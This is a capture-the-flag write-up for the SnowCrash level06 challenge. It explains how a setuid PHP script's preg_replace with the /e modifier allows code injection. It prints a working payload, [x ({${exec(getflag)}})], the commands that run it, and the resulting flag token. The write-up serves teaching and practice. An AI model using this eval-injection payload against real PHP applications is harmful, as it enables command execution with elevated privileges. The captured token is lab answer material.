# level06

## Recognition

There is a php script and an executable which executes the script as flag06.

```bash
level06@SnowCrash:~$ ls -l
total 12
-r--r-----+ 1 level06 level06    0 May  6 16:15 file
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

This script is a php script which opens a file after going through a bunch of regexes, one of them uses the `e` modiffier flag which performs `eval` on the matched content.
```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./",  " x ",  $m);
    $m = preg_replace("/@/",   " y",   $m);
    return $m;
}


function x($y, $z)
{ 
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e",   "y(\"\\2\")",   $a);
    $a = preg_replace("/\[/",              "(",            $a);
    $a = preg_replace("/\]/",              ")",            $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

</br>
</br>

## Exploitation

We need to find a way to bypass the regexes to execute our payload, first we can see that it will open the file refernced in `argv[1]` and try to evaluate it if it matches the regex `(\[x (.*)\])`.

We can then use that as a vector to introduce our payload 
```
[x (PAYLOAD)]
```


Then, by using the php expression `${exec(getflag)}` which will
create a variable containing a simple php call to `exec` running the `getflag` command, which will then need to be interpolated into the string with the `{}` expression.
Since the string, if it matches the regex, will be executed, it results in executing the `getflag` command as the flag06 user.
```
[x ({${exec(getflag)}})]
```

We can then exploit the script like this
```bash
level06@SnowCrash:~$ echo '[x ({${exec(getflag)}})]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
()
```

